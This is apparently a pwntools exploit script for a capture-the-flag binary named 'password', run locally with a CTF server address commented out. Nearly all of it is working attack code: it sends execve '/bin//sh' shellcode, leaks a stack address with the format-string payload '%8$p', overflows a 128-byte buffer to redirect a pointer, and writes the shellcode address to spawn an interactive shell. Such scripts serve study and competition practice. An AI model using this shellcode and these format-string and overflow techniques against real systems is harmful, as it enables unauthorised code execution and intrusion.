#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

remote_service = "chal1.pctf.competitivecyber.club 10013"
remote_service = remote_service.strip().split(" ")
# p = remote(remote_service[0], int(remote_service[1]))
filename = "./password"
p = process(filename)
e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
	lg("p.pid")
	input()

off1 = 0xd0
ru(b"this application, so you shouldn't even bother trying!\n")
rl()
sc = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"
sl(sc)
ru(b"quit: Stop the program.\n")
sl(b"new")
sl(b"%8$p")
ru(b'> Enter the password (128 max characters): Password created with ID #')
id0 = int(ru(b'.\n', "drop"))
sl(b"print " + str(id0).encode())
ru(b'> Password #')
ru(b"\n")
sc_addr = int(ru(b"\n", "drop"), 16) + off1
lg("sc_addr")
# debugPID()

sl(b"new")
sl(b"aaa")
ru(b'> Enter the password (128 max characters): Password created with ID #')
id1 = int(ru(b'.\n', "drop"))
# debugPID()

sl(b"modify " + str(id1).encode())
sl(b"a"*128 + p64(sc_addr+0x88-128+8))
debugPID()


sl(b"modify " + str(0x100000000).encode())
sl((sc[16:]).ljust(0x78, b'a') + p64(sc_addr))
debugPID()

sl(b"modify " + str(id1).encode())
sl(b"a"*128 + p64(0))
debugPID()

irt()
